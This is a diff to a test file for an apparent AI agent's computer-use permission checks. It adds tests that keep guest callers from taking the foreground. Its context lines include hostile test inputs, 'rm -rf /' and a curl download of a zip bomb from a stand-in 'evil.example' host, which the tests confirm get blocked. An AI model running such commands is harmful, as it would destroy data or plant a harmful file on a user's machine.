@@ -11,6 +11,7 @@ import {
   diffTreeText,
   formatAppState,
   parseComputerUseArgs,
+  refusedForeground,
   treeUnchanged,
   YAN_EMAIL,
 } from "./computer-use.js";
@@ -110,8 +111,10 @@ describe("computer use permissions", () => {
       guestCaller: { slug: "austin" },
     });
     assert.match(yan, /This turn is Yan/);
+    assert.match(yan, /come forward/);
     assert.doesNotMatch(yan, /epschedule/);
     assert.match(guest, /epschedule/);
+    assert.match(guest, /never passes foreground/);
     assert.match(guest, /LM Studio/);
     assert.match(guest, /JYPE/);
     const tools = computerUseCustomTools({
@@ -130,6 +133,13 @@ describe("computer use permissions", () => {
     assert.match(blockedComputerUseText("rm -rf /"), /system files/);
     assert.match(blockedComputerUseText("curl -O https://evil.example/42.zip"), /zip bomb/);
     assert.equal(blockedComputerUseText("download the notes pdf"), "");
+    assert.equal(refusedForeground({ email: YAN_EMAIL }, true), "");
+    assert.equal(refusedForeground({ email: YAN_EMAIL }, false), "");
+    assert.match(
+      refusedForeground({ email: YAN_EMAIL, guestCaller: { slug: "alex-rivera" } }, true),
+      /desktop/
+    );
+    assert.match(refusedForeground({ email: "you@example.com" }, true), /desktop/);
     assert.match(
       blockedComputerUseTarget(
         { name: "Delete", value: "/System/Library" },
@@ -226,6 +236,7 @@ describe("computer use cli", () => {
   it("parses state, click, and type", () => {
     assert.equal(parseComputerUseArgs(["state", "TextEdit"]).app, "TextEdit");
     assert.equal(parseComputerUseArgs(["click", "2"]).id, 2);
+    assert.equal(parseComputerUseArgs(["click", "--x", "4", "--y", "5", "--foreground"]).foreground, true);
     const typed = parseComputerUseArgs(["type", "2", "--text", "hello there"]);
     assert.equal(typed.id, 2);
     assert.equal(typed.text, "hello there");
